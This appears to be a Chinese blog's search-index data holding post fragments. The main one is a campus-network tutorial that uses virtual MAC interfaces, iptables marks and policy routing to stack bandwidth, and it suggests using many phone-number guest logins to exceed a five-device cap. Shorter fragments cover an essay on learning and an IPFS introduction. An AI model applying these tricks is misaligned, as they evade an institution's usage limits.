这其实是因为你的主机只有一个默认网关，流量实际上只走了一条线，所以还是受单接口限速的限制。我们的目的是让流量能够分别走多个接口，从而达到速度叠加的效果，也就是常说的负载均衡 思路是：通过iptables规则给数据包打上标记，然后通过策略路由根据标记来选择走哪个接口出去。需要注意不同包之间的关系，追踪连接状态并恢复标记，否则的话同一个连接的不同包走了不同的接口，会被丢弃掉。 创建路由表 首先创建多个路由表，因为每一个路由表只能默认走一个接口，所以刚刚创建了多少虚拟网络接口，这里就要增加几个路由表，我按照2个接口来演示 编辑 /etc/iproute2/rt_tables 文件，在文件末尾增加两个路由表 # 新增的路由表 100 vmac0 101 vmac1 保证新路由表中没有条目，先清空一下 ip route flush table vmac0 ip route flush table vmac1 分别为两个路由表增加默认路由项，分别走不同的网络接口 ip route add 0/0 dev vmac0 table vmac0 ip route add 0/0 dev vmac1 table vmac1 配置iptables 分别创建多个新的链 iptables -t mangle -N VMAC0 iptables -t mangle -A VMAC0 -j MARK --set-mark 0x100 iptables -t mangle -A VMAC0 -j CONNMARK --save-mark iptables -t mangle -N VMAC1 iptables -t mangle -A VMAC1 -j MARK --set-mark 0x101 iptables -t mangle -A VMAC1 -j CONNMARK --save-mark 配置打标记的规则，每两个包（只看新建的连接）中第一个交给VMAC0处理，第二个交给VMAC1处理 iptables -t mangle -A OUTPUT -o vmac+ -m state --state NEW -m statistic --mode nth --every 2 --packet 0 -j VMAC0 iptables -t mangle -A OUTPUT -o vmac+ -m state --state NEW -m statistic --mode nth --every 2 --packet 1 -j VMAC1 iptables -t mangle -A OUTPUT -o vmac+ -m state --state ESTABLISHED,RELATED -j CONNMARK --restore-mark 配置策略路由 下面需要配置策略路由，根据我们设置的策略，流量分别由多个路由表进行路由，所以就可以走多个网络接口了 我们让防火墙标记为0x100的用vmac0路由表，标记为0x101流量的用vmac1路由表 ip rule add fwmark 0x100 table vmac0 ip rule add fwmark 0x101 table vmac1 此时会出现一个问题，就是从外部发起的连接在进来后并没有打上防火墙标记，所以返回的包只能走默认的路由表。假如我们的默认路由表的默认路由是走vmac0，那来自vmac1的请求的响应包也会走vmac0出去，因为不属于同一个连接，这个包就会被丢掉。 我们的解决方法是再增加两条规则，来自哪个网卡的包的响应就从该网卡出 ip rule add from table vmac0 ip rule add from table vmac1 用作路由器 如果这台linux需要用作网关，需要配置PREROUTING链，这里假设内网网段为 192.168/16 iptables -t mangle -A PREROUTING -s 192.168/16 ! -d 192.168/16 -m state --state NEW -m statistic --mode nth --every 2 --packet 0 -j VMAC0 iptables -t mangle -A PREROUTING -s 192.168/16 ! -d 192.168/16 -m state --state NEW -m statistic --mode nth --every 2 --packet 1 -j VMAC1 iptables -t mangle -A PREROUTING -s 192.168/16 ! -d 192.168/16 -m state --state ESTABLISHED,RELATED -j CONNMARK --restore-mark 同时需要对内网流量进行SNAT iptables -t nat -A POSTROUTING -o vmac+ -j MASQUERADE 经过上面的步骤，已经能够利用多个网络接口了。不过我们本质上是通过连接分流的，同一个连接的所有包会走同一个接口出去，所以如果你的程序是单线程网络，就看不到加速效果。可以通过speedtest多线程来进行测试，可以看到明显的网速叠加。 注意 我刚刚的演示重启后虚拟网卡会丢失，因为自动分配的mac地址，重新运行命令会导致mac和ip变动，需要重新认证 可以使用指定mac地址的方法创建，也有持久化虚拟网卡的方法，可以一劳永逸 后面会将更加成熟的方法，这里手工配置不是重点，需要的自行学习研究吧！ ","date":"2021-04-11","objectID":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/:1:3","series":null,"tags":["Linux","多拨"],"title":"垃圾校园网，我忍不了了","uri":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/#创建路由表"},{"categories":["tutorial"],"content":"进行路由级别的分流 经过上面的步骤，其实现在已经有多个可以上网的接口了，每一个接口都限速30Mbps，可以通过修改路由表验证，但是测速发现还是总速度还是30Mbps，速度并没有叠加 这其实是因为你的主机只有一个默认网关，流量实际上只走了一条线，所以还是受单接口限速的限制。我们的目的是让流量能够分别走多个接口，从而达到速度叠加的效果，也就是常说的负载均衡 思路是：通过iptables规则给数据包打上标记，然后通过策略路由根据标记来选择走哪个接口出去。需要注意不同包之间的关系，追踪连接状态并恢复标记，否则的话同一个连接的不同包走了不同的接口，会被丢弃掉。 创建路由表 首先创建多个路由表，因为每一个路由表只能默认走一个接口，所以刚刚创建了多少虚拟网络接口，这里就要增加几个路由表，我按照2个接口来演示 编辑 /etc/iproute2/rt_tables 文件，在文件末尾增加两个路由表 # 新增的路由表 100 vmac0 101 vmac1 保证新路由表中没有条目，先清空一下 ip route flush table vmac0 ip route flush table vmac1 分别为两个路由表增加默认路由项，分别走不同的网络接口 ip route add 0/0 dev vmac0 table vmac0 ip route add 0/0 dev vmac1 table vmac1 配置iptables 分别创建多个新的链 iptables -t mangle -N VMAC0 iptables -t mangle -A VMAC0 -j MARK --set-mark 0x100 iptables -t mangle -A VMAC0 -j CONNMARK --save-mark iptables -t mangle -N VMAC1 iptables -t mangle -A VMAC1 -j MARK --set-mark 0x101 iptables -t mangle -A VMAC1 -j CONNMARK --save-mark 配置打标记的规则，每两个包（只看新建的连接）中第一个交给VMAC0处理，第二个交给VMAC1处理 iptables -t mangle -A OUTPUT -o vmac+ -m state --state NEW -m statistic --mode nth --every 2 --packet 0 -j VMAC0 iptables -t mangle -A OUTPUT -o vmac+ -m state --state NEW -m statistic --mode nth --every 2 --packet 1 -j VMAC1 iptables -t mangle -A OUTPUT -o vmac+ -m state --state ESTABLISHED,RELATED -j CONNMARK --restore-mark 配置策略路由 下面需要配置策略路由，根据我们设置的策略，流量分别由多个路由表进行路由，所以就可以走多个网络接口了 我们让防火墙标记为0x100的用vmac0路由表，标记为0x101流量的用vmac1路由表 ip rule add fwmark 0x100 table vmac0 ip rule add fwmark 0x101 table vmac1 此时会出现一个问题，就是从外部发起的连接在进来后并没有打上防火墙标记，所以返回的包只能走默认的路由表。假如我们的默认路由表的默认路由是走vmac0，那来自vmac1的请求的响应包也会走vmac0出去，因为不属于同一个连接，这个包就会被丢掉。 我们的解决方法是再增加两条规则，来自哪个网卡的包的响应就从该网卡出 ip rule add from table vmac0 ip rule add from table vmac1 用作路由器 如果这台linux需要用作网关，需要配置PREROUTING链，这里假设内网网段为 192.168/16 iptables -t mangle -A PREROUTING -s 192.168/16 ! -d 192.168/16 -m state --state NEW -m statistic --mode nth --every 2 --packet 0 -j VMAC0 iptables -t mangle -A PREROUTING -s 192.168/16 ! -d 192.168/16 -m state --state NEW -m statistic --mode nth --every 2 --packet 1 -j VMAC1 iptables -t mangle -A PREROUTING -s 192.168/16 ! -d 192.168/16 -m state --state ESTABLISHED,RELATED -j CONNMARK --restore-mark 同时需要对内网流量进行SNAT iptables -t nat -A POSTROUTING -o vmac+ -j MASQUERADE 经过上面的步骤，已经能够利用多个网络接口了。不过我们本质上是通过连接分流的，同一个连接的所有包会走同一个接口出去，所以如果你的程序是单线程网络，就看不到加速效果。可以通过speedtest多线程来进行测试，可以看到明显的网速叠加。 注意 我刚刚的演示重启后虚拟网卡会丢失，因为自动分配的mac地址，重新运行命令会导致mac和ip变动，需要重新认证 可以使用指定mac地址的方法创建，也有持久化虚拟网卡的方法，可以一劳永逸 后面会将更加成熟的方法，这里手工配置不是重点，需要的自行学习研究吧！ ","date":"2021-04-11","objectID":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/:1:3","series":null,"tags":["Linux","多拨"],"title":"垃圾校园网，我忍不了了","uri":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/#配置iptables"},{"categories":["tutorial"],"content":"进行路由级别的分流 经过上面的步骤，其实现在已经有多个可以上网的接口了，每一个接口都限速30Mbps，可以通过修改路由表验证，但是测速发现还是总速度还是30Mbps，速度并没有叠加 这其实是因为你的主机只有一个默认网关，流量实际上只走了一条线，所以还是受单接口限速的限制。我们的目的是让流量能够分别走多个接口，从而达到速度叠加的效果，也就是常说的负载均衡 思路是：通过iptables规则给数据包打上标记，然后通过策略路由根据标记来选择走哪个接口出去。需要注意不同包之间的关系，追踪连接状态并恢复标记，否则的话同一个连接的不同包走了不同的接口，会被丢弃掉。 创建路由表 首先创建多个路由表，因为每一个路由表只能默认走一个接口，所以刚刚创建了多少虚拟网络接口，这里就要增加几个路由表，我按照2个接口来演示 编辑 /etc/iproute2/rt_tables 文件，在文件末尾增加两个路由表 # 新增的路由表 100 vmac0 101 vmac1 保证新路由表中没有条目，先清空一下 ip route flush table vmac0 ip route flush table vmac1 分别为两个路由表增加默认路由项，分别走不同的网络接口 ip route add 0/0 dev vmac0 table vmac0 ip route add 0/0 dev vmac1 table vmac1 配置iptables 分别创建多个新的链 iptables -t mangle -N VMAC0 iptables -t mangle -A VMAC0 -j MARK --set-mark 0x100 iptables -t mangle -A VMAC0 -j CONNMARK --save-mark iptables -t mangle -N VMAC1 iptables -t mangle -A VMAC1 -j MARK --set-mark 0x101 iptables -t mangle -A VMAC1 -j CONNMARK --save-mark 配置打标记的规则，每两个包（只看新建的连接）中第一个交给VMAC0处理，第二个交给VMAC1处理 iptables -t mangle -A OUTPUT -o vmac+ -m state --state NEW -m statistic --mode nth --every 2 --packet 0 -j VMAC0 iptables -t mangle -A OUTPUT -o vmac+ -m state --state NEW -m statistic --mode nth --every 2 --packet 1 -j VMAC1 iptables -t mangle -A OUTPUT -o vmac+ -m state --state ESTABLISHED,RELATED -j CONNMARK --restore-mark 配置策略路由 下面需要配置策略路由，根据我们设置的策略，流量分别由多个路由表进行路由，所以就可以走多个网络接口了 我们让防火墙标记为0x100的用vmac0路由表，标记为0x101流量的用vmac1路由表 ip rule add fwmark 0x100 table vmac0 ip rule add fwmark 0x101 table vmac1 此时会出现一个问题，就是从外部发起的连接在进来后并没有打上防火墙标记，所以返回的包只能走默认的路由表。假如我们的默认路由表的默认路由是走vmac0，那来自vmac1的请求的响应包也会走vmac0出去，因为不属于同一个连接，这个包就会被丢掉。 我们的解决方法是再增加两条规则，来自哪个网卡的包的响应就从该网卡出 ip rule add from table vmac0 ip rule add from table vmac1 用作路由器 如果这台linux需要用作网关，需要配置PREROUTING链，这里假设内网网段为 192.168/16 iptables -t mangle -A PREROUTING -s 192.168/16 ! -d 192.168/16 -m state --state NEW -m statistic --mode nth --every 2 --packet 0 -j VMAC0 iptables -t mangle -A PREROUTING -s 192.168/16 ! -d 192.168/16 -m state --state NEW -m statistic --mode nth --every 2 --packet 1 -j VMAC1 iptables -t mangle -A PREROUTING -s 192.168/16 ! -d 192.168/16 -m state --state ESTABLISHED,RELATED -j CONNMARK --restore-mark 同时需要对内网流量进行SNAT iptables -t nat -A POSTROUTING -o vmac+ -j MASQUERADE 经过上面的步骤，已经能够利用多个网络接口了。不过我们本质上是通过连接分流的，同一个连接的所有包会走同一个接口出去，所以如果你的程序是单线程网络，就看不到加速效果。可以通过speedtest多线程来进行测试，可以看到明显的网速叠加。 注意 我刚刚的演示重启后虚拟网卡会丢失，因为自动分配的mac地址，重新运行命令会导致mac和ip变动，需要重新认证 可以使用指定mac地址的方法创建，也有持久化虚拟网卡的方法，可以一劳永逸 后面会将更加成熟的方法，这里手工配置不是重点，需要的自行学习研究吧！ ","date":"2021-04-11","objectID":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/:1:3","series":null,"tags":["Linux","多拨"],"title":"垃圾校园网，我忍不了了","uri":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/#配置策略路由"},{"categories":["tutorial"],"content":"进行路由级别的分流 经过上面的步骤，其实现在已经有多个可以上网的接口了，每一个接口都限速30Mbps，可以通过修改路由表验证，但是测速发现还是总速度还是30Mbps，速度并没有叠加 这其实是因为你的主机只有一个默认网关，流量实际上只走了一条线，所以还是受单接口限速的限制。我们的目的是让流量能够分别走多个接口，从而达到速度叠加的效果，也就是常说的负载均衡 思路是：通过iptables规则给数据包打上标记，然后通过策略路由根据标记来选择走哪个接口出去。需要注意不同包之间的关系，追踪连接状态并恢复标记，否则的话同一个连接的不同包走了不同的接口，会被丢弃掉。 创建路由表 首先创建多个路由表，因为每一个路由表只能默认走一个接口，所以刚刚创建了多少虚拟网络接口，这里就要增加几个路由表，我按照2个接口来演示 编辑 /etc/iproute2/rt_tables 文件，在文件末尾增加两个路由表 # 新增的路由表 100 vmac0 101 vmac1 保证新路由表中没有条目，先清空一下 ip route flush table vmac0 ip route flush table vmac1 分别为两个路由表增加默认路由项，分别走不同的网络接口 ip route add 0/0 dev vmac0 table vmac0 ip route add 0/0 dev vmac1 table vmac1 配置iptables 分别创建多个新的链 iptables -t mangle -N VMAC0 iptables -t mangle -A VMAC0 -j MARK --set-mark 0x100 iptables -t mangle -A VMAC0 -j CONNMARK --save-mark iptables -t mangle -N VMAC1 iptables -t mangle -A VMAC1 -j MARK --set-mark 0x101 iptables -t mangle -A VMAC1 -j CONNMARK --save-mark 配置打标记的规则，每两个包（只看新建的连接）中第一个交给VMAC0处理，第二个交给VMAC1处理 iptables -t mangle -A OUTPUT -o vmac+ -m state --state NEW -m statistic --mode nth --every 2 --packet 0 -j VMAC0 iptables -t mangle -A OUTPUT -o vmac+ -m state --state NEW -m statistic --mode nth --every 2 --packet 1 -j VMAC1 iptables -t mangle -A OUTPUT -o vmac+ -m state --state ESTABLISHED,RELATED -j CONNMARK --restore-mark 配置策略路由 下面需要配置策略路由，根据我们设置的策略，流量分别由多个路由表进行路由，所以就可以走多个网络接口了 我们让防火墙标记为0x100的用vmac0路由表，标记为0x101流量的用vmac1路由表 ip rule add fwmark 0x100 table vmac0 ip rule add fwmark 0x101 table vmac1 此时会出现一个问题，就是从外部发起的连接在进来后并没有打上防火墙标记，所以返回的包只能走默认的路由表。假如我们的默认路由表的默认路由是走vmac0，那来自vmac1的请求的响应包也会走vmac0出去，因为不属于同一个连接，这个包就会被丢掉。 我们的解决方法是再增加两条规则，来自哪个网卡的包的响应就从该网卡出 ip rule add from table vmac0 ip rule add from table vmac1 用作路由器 如果这台linux需要用作网关，需要配置PREROUTING链，这里假设内网网段为 192.168/16 iptables -t mangle -A PREROUTING -s 192.168/16 ! -d 192.168/16 -m state --state NEW -m statistic --mode nth --every 2 --packet 0 -j VMAC0 iptables -t mangle -A PREROUTING -s 192.168/16 ! -d 192.168/16 -m state --state NEW -m statistic --mode nth --every 2 --packet 1 -j VMAC1 iptables -t mangle -A PREROUTING -s 192.168/16 ! -d 192.168/16 -m state --state ESTABLISHED,RELATED -j CONNMARK --restore-mark 同时需要对内网流量进行SNAT iptables -t nat -A POSTROUTING -o vmac+ -j MASQUERADE 经过上面的步骤，已经能够利用多个网络接口了。不过我们本质上是通过连接分流的，同一个连接的所有包会走同一个接口出去，所以如果你的程序是单线程网络，就看不到加速效果。可以通过speedtest多线程来进行测试，可以看到明显的网速叠加。 注意 我刚刚的演示重启后虚拟网卡会丢失，因为自动分配的mac地址，重新运行命令会导致mac和ip变动，需要重新认证 可以使用指定mac地址的方法创建，也有持久化虚拟网卡的方法，可以一劳永逸 后面会将更加成熟的方法，这里手工配置不是重点，需要的自行学习研究吧！ ","date":"2021-04-11","objectID":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/:1:3","series":null,"tags":["Linux","多拨"],"title":"垃圾校园网，我忍不了了","uri":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/#用作路由器"},{"categories":["tutorial"],"content":"使用OpenWrt+mwan3 我比较推荐在宿舍里搞个软路由，普通的路由刷OpenWrt或者弄个树莓派刷OpenWrt都行，可以考虑买个二手矿渣 newifi 3 或者 R2S 因为在OpenWrt里面有现成的插件，可以非常方便的创建多个虚拟网络接口，并能够利用图形界面配置更加强大的分流策略。 主要涉及到两个插件：kmod-macvlan和mwan3 ","date":"2021-04-11","objectID":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/:2:0","series":null,"tags":["Linux","多拨"],"title":"垃圾校园网，我忍不了了","uri":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/#使用openwrtmwan3"},{"categories":["tutorial"],"content":"添加设备，获取IP 首先在正确配置好网络的基础上，先创建网络设备，类型是macvlan，在学习了Linux下手工操作的基础上，这里的配置项都好理解 要几拨就添加几个设备，注意最好手工指定一下mac，基础设备选正常上网的wan口物理设备 然后添加相同数量的接口，协议选DHCP，接口设备选刚刚创建的，一一对应 接口添加好后，进行连接就会自动获取IP了，然后与上面手工方式一样，把所有IP都认证一下 ","date":"2021-04-11","objectID":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/:2:1","series":null,"tags":["Linux","多拨"],"title":"垃圾校园网，我忍不了了","uri":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/#添加设备获取ip"},{"categories":["tutorial"],"content":"配置mwan3分流 在mwan的管理界面，首先添加接口，与网络里面刚刚配置的接口一一对应 注意 这里涉及到接口可用性的检测，需要仔细设置一下，后面的分流需要依赖这个可用性检测，总不能把流量分给不可用的接口吧 然后添加成员，与刚刚添加的接口一一对应，这里添加的可以在后面策略那里选择 添加策略，图中第一条是负载均衡策略，刚刚添加的成员全都选中，意思就是说同时使用这所有的网络 后面几条策略分别是用来测试想用网络设备的 最后添加分流规则，最简单的如图所示，目的地址不限，端口不限，协议不限，都走负载均衡策略，也就是从所有网口出 在状态面板可以看到，多拨成功 技巧 mwan3代码在：https://github.com/openwrt/packages/tree/master/net/mwan3 ","date":"2021-04-11","objectID":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/:2:2","series":null,"tags":["Linux","多拨"],"title":"垃圾校园网，我忍不了了","uri":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/#配置mwan3分流"},{"categories":["tutorial"],"content":"爱快，分流很强大 正好我在的实验室里有老旧的台式机，又有多个网卡，我就安装了以分流著称的iKuai系统 爱快路由系统对性能要求很高，64位甚至要求4G运存才能安装，不太建议宿舍用，不过实话实话这个是真的爽 首先在网路设置中，选择正确的物理网卡，接入方式选基于物理网卡的混合模式，在DHCP模式下添加多个虚拟网络接口，mac地址自己指定 关开网络接口，让其DHCP获取到IP地址，然后按照之前说的方法进行网络认证 然后进入分流设置，配置多线负载 添加的时候有多种负载模式可供选择，可以添加多个负载规则。注意要把前面创建的网络接口全部开启 对！就是这么简单，iKuai就是牛，已经把网速叠加成功了 ","date":"2021-04-11","objectID":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/:3:0","series":null,"tags":["Linux","多拨"],"title":"垃圾校园网，我忍不了了","uri":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/#爱快分流很强大"},{"categories":["tutorial"],"content":"新发现 在与同学的交流中，发现校园网还可以用任意手机号验证码登录，登陆后的权限是访客，不过与学生权限一样，如此看来可以利用多个手机号突破5台设备的限制了 注意，登录成功后一定要修改密码，否则第二次登录的时候会提示创建新账号失败，是后台的BUG，日 最后，向大家推荐一个讲iptables的视频，可以在Youtube或者Bilibili搜索坏人的iptables小讲堂，讲的真的很不错 ","date":"2021-04-11","objectID":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/:4:0","series":null,"tags":["Linux","多拨"],"title":"垃圾校园网，我忍不了了","uri":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/#新发现"},{"categories":["thinking"],"content":"在知识爆炸的时代，大家都想通过直接学习提炼过的内容来快速获取知识，但在我看来如果想要在某一领域深入，必须避免这种捷径方法","date":"2021-04-05","objectID":"https://zu1k.com/posts/thinking/knowledge-refining/","series":null,"tags":["thinking"],"title":"反对直接学习经过提炼的知识","uri":"https://zu1k.com/posts/thinking/knowledge-refining/"},{"categories":["thinking"],"content":"这个时代是一个内容爆炸、知识爆炸的时代，文字、图片、视频、书籍等资料比以往更加容易获取，还有来自于各种各样的软件、媒体的信息应接不暇，所有人都主动的或被动的处于持续学习的阶段。 为了能够更快速、更高效的获取知识，很多人会选择直接学习别人总结提炼过的内容。这种行为非常常见，学生购买的各种总结性资料例如学长笔记、知识点提纲、公式定理小手册，程序员阅读总结性文章等。 这种通过直接学习提炼过的内容的方法比普通的循规蹈矩的方法速度快很多，在绝大多数情况下解决问题也比传统方法更加有效，因为其能够直接指出关键点，能够直接给出解决方案，因此非常受大家喜爱。 在我看来，如果仅仅是要对某一方面知识进行粗略了解，这种方法行之有效，但如果想要在某一领域深入，甚至以后想要通过该领域养活自己，就必须避免使用这种捷径方法。 ","date":"2021-04-05","objectID":"https://zu1k.com/posts/thinking/knowledge-refining/:0:0","series":null,"tags":["thinking"],"title":"反对直接学习经过提炼的知识","uri":"https://zu1k.com/posts/thinking/knowledge-refining/#"},{"categories":["thinking"],"content":"提炼的知识丢失了很多细节 进行内容提炼必定会丢失细节，这是毫无疑问的。抱着学习的态度，我们还要考虑更多因素，包括进行内容提炼的人他自己的水平，还有提炼者自己的研究是否侧重于某个特定方向，从而可能导致内容的偏向性和不全面。 ","date":"2021-04-05","objectID":"https://zu1k.com/posts/thinking/knowledge-refining/:0:1","series":null,"tags":["thinking"],"title":"反对直接学习经过提炼的知识","uri":"https://zu1k.com/posts/thinking/knowledge-refining/#提炼的知识丢失了很多细节"},{"categories":["thinking"],"content":"提炼的知识只包含结果，丢失了过程 从初高中一直到大学，看过一些总结性内容，包括学长笔记、考点汇总等等。我发现这些内容为了能够更直接的传达内容，往往只包含结果，而丢失了这个内容是如何来的或者为什么如此的过程。 不是说这些总结提炼的内容不好，我反对的是为了省事而跳过对知识的由来和证明的学习。 从问题的提出到分析再到最后解决从而总结出知识的过程，比学习这个知识本身更有价值。很多知识我们后面的人生中可能根本用不到，但在这个过程中用到的方法我们如果掌握了，就可以迁移到其他新问题的解决中，这可能比某个知识本身更有价值。 ","date":"2021-04-05","objectID":"https://zu1k.com/posts/thinking/knowledge-refining/:0:2","series":null,"tags":["thinking"],"title":"反对直接学习经过提炼的知识","uri":"https://zu1k.com/posts/thinking/knowledge-refining/#提炼的知识只包含结果丢失了过程"},{"categories":["thinking"],"content":"提炼的知识影响了拓展思维 提到影响拓展思维，其实我想表达的是，直接学习提炼的内容，目的性太强，以至于难以进行胡思乱想。 我从小在学习新事物的时候总会进行各种奇奇怪怪的联想，我不认为这会导致我的注意力分散，相反，我认为这种联想应该是必不可少的，能够为以后的发展拓宽思维，避免陷入木偶人生。 ","date":"2021-04-05","objectID":"https://zu1k.com/posts/thinking/knowledge-refining/:0:3","series":null,"tags":["thinking"],"title":"反对直接学习经过提炼的知识","uri":"https://zu1k.com/posts/thinking/knowledge-refining/#提炼的知识影响了拓展思维"},{"categories":["thinking"],"content":"应该在学习过程中掌握的能力 实话实说，我早已没有了小时候那个学遍所有可以接触到的知识的幻想，知识的种类和覆盖的范围如此广泛，在计算机和网络盛行的时代，掌握知识的数量早已不是衡量一个人能力高低的标准，学富五车也敌不过随时查一下互联网。 那我们学习知识是为了啥？在我看来，学会如何进行学习，学会如何进行提升，这个能力才能保证自己的不断进步，才是在学习基础知识的过程中必须掌握的能力，是比知识本身更为重要和珍贵的东西。 ","date":"2021-04-05","objectID":"https://zu1k.com/posts/thinking/knowledge-refining/:1:0","series":null,"tags":["thinking"],"title":"反对直接学习经过提炼的知识","uri":"https://zu1k.com/posts/thinking/knowledge-refining/#应该在学习过程中掌握的能力"},{"categories":["thinking"],"content":"发现问题的能力 越来越发现，能够发现问题的确是需要特殊培养的能力。很多情况下，明明一个非常新颖的问题就在眼前，可就是没有那个去发现它的慧眼，白白把机会让给了别人。一个典型的例子就是牛顿被苹果砸了一下然后经过研究发现了万有引力，我从心底里相信这个故事是特意编出来的，但是还是应该反思一下自己，小时候自己提出过类似的问题吗？ 在学习的过程中，如果能够去了解一下古人如何提出一个问题，就会慢慢的学习到如何去看待一个新发现的事物，甚至能够从日常可见的已经习以为常的事物中发现新的问题，这是非常了不起的能力。 ","date":"2021-04-05","objectID":"https://zu1k.com/posts/thinking/knowledge-refining/:1:1","series":null,"tags":["thinking"],"title":"反对直接学习经过提炼的知识","uri":"https://zu1k.com/posts/thinking/knowledge-refining/#发现问题的能力"},{"categories":["thinking"],"content":"分析问题的能力 面对一个新问题，要有去分析的能力，知道该从哪里入手分析，知道分析的方法，能够评估自己的方法。 能够提出自己的想法，即使最终无法完美的解决问题，但这个过程是非常重要的。 ","date":"2021-04-05","objectID":"https://zu1k.com/posts/thinking/knowledge-refining/:1:2","series":null,"tags":["thinking"],"title":"反对直接学习经过提炼的知识","uri":"https://zu1k.com/posts/thinking/knowledge-refining/#分析问题的能力"},{"categories":["tutorial"],"content":"IPFS是新兴的技术，在这篇文章里我详细的讲述了IPFS的特色、技术和使用方法，并介绍如何将自己的网站部署到IPFS上","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/"},{"categories":["tutorial"],"content":"IPFS简介 IPFS全称InterPlanetary File System，中文名叫星际文件系统，听起来非常酷炫。 它是是一个旨在创建持久且分布式存储和共享文件的网络传输协议，是一种内容可寻址的对等超媒体分发协议。在IPFS网络中的全球所有节点将构成一个分布式文件系统，全球中的每一个人都可以通过IPFS网关存储和访问IPFS里面的文件。 这个酷炫的项目最初由Juan Benet设计，自2014年开始由Protocol Labs在开源社区的帮助下发展，是一个完全开源的项目。 IPFS官网 GitHub ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:1:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#ipfs简介"},{"categories":["tutorial"],"content":"IPFS的优点 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:2:0","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#ipfs的优点"},{"categories":["tutorial"],"content":"与现有Web比较 现有的网络技术效率低下、成本高昂 HTTP一次从一台计算机下载文件，而不是同时从多台计算机获取文件。点对点IPFS节省了大量的带宽，视频高达60%，这使得无需重复地高效地分发大量数据成为可能。 现有的网络无法保存人类的历史 一个网页的平均寿命是100天，然后就永远消失了。我们这个时代的主要媒介还不够脆弱。IPFS保留文件的每一个版本，并使为镜像数据建立弹性网络变得简单。 现有的网络是集中的，限制了机会 互联网作为人类历史上最伟大的均衡器之一，推动了创新的发展，但日益巩固的集权控制威胁着这一进步。IPFS通过分布式技术来避免这一点。 现有的网络深度依赖主干网 IPFS支持创建多样化的弹性网络，以实现持久可用性，无论是否有Internet主干网连接。这意味着发展中国家在自然灾害期间，或者在咖啡厅的wi-fi上时，能够更好地连接。 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:2:1","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#与现有web比较"},{"categories":["tutorial"],"content":"与现有Web比较 现有的网络技术效率低下、成本高昂 HTTP一次从一台计算机下载文件，而不是同时从多台计算机获取文件。点对点IPFS节省了大量的带宽，视频高达60%，这使得无需重复地高效地分发大量数据成为可能。 现有的网络无法保存人类的历史 一个网页的平均寿命是100天，然后就永远消失了。我们这个时代的主要媒介还不够脆弱。IPFS保留文件的每一个版本，并使为镜像数据建立弹性网络变得简单。 现有的网络是集中的，限制了机会 互联网作为人类历史上最伟大的均衡器之一，推动了创新的发展，但日益巩固的集权控制威胁着这一进步。IPFS通过分布式技术来避免这一点。 现有的网络深度依赖主干网 IPFS支持创建多样化的弹性网络，以实现持久可用性，无论是否有Internet主干网连接。这意味着发展中国家在自然灾害期间，或者在咖啡厅的wi-fi上时，能够更好地连接。 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:2:1","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#现有的网络技术效率低下成本高昂"},{"categories":["tutorial"],"content":"与现有Web比较 现有的网络技术效率低下、成本高昂 HTTP一次从一台计算机下载文件，而不是同时从多台计算机获取文件。点对点IPFS节省了大量的带宽，视频高达60%，这使得无需重复地高效地分发大量数据成为可能。 现有的网络无法保存人类的历史 一个网页的平均寿命是100天，然后就永远消失了。我们这个时代的主要媒介还不够脆弱。IPFS保留文件的每一个版本，并使为镜像数据建立弹性网络变得简单。 现有的网络是集中的，限制了机会 互联网作为人类历史上最伟大的均衡器之一，推动了创新的发展，但日益巩固的集权控制威胁着这一进步。IPFS通过分布式技术来避免这一点。 现有的网络深度依赖主干网 IPFS支持创建多样化的弹性网络，以实现持久可用性，无论是否有Internet主干网连接。这意味着发展中国家在自然灾害期间，或者在咖啡厅的wi-fi上时，能够更好地连接。 ","date":"2020-11-29","objectID":"https://zu1k.com/posts/tutorials/p2p/ipfs/:2:1","series":null,"tags":["IPFS","P2P"],"title":"IPFS 新手指北","uri":"https://zu1k.com/posts/tutorials/p2p/ipfs/#现有的网络无法保存人类的历史"},{"categories":["tutorial"],"content":"与现有Web比较 现有的网络技术效率低下、成本高昂 HTTP一次从一台计算机下载文件，而不是同时从多台计算机获取文件。点对点IPFS节省了大量的带宽，视频高达60%，这使得无需重复地高效地分发大量数据成为可能。 现有的网络无法保存人类的历史 一个网页的平均寿命是100天，然后就永远消失了。我们这个时代的主要媒介还不够脆弱。IPFS保留文件的每一个版本，并使为镜像数据建立弹性网络变得简单。 现有的网络是集中的，限制了机会 互联网作为人类历史上最伟大的均衡器之一，推动了创新的发展，但日益巩固的集权控制威胁着这一进步。IPFS通过分布式技术来避免这一点。 现有的网络深度依赖主干网 IPFS支持创建多样化的弹性网络，以实现持久可用性，无论是否有Internet主干网连接。这意味着发展中国家在自然灾害期间，或者在咖啡厅的wi-fi上时，能够更好地连接。 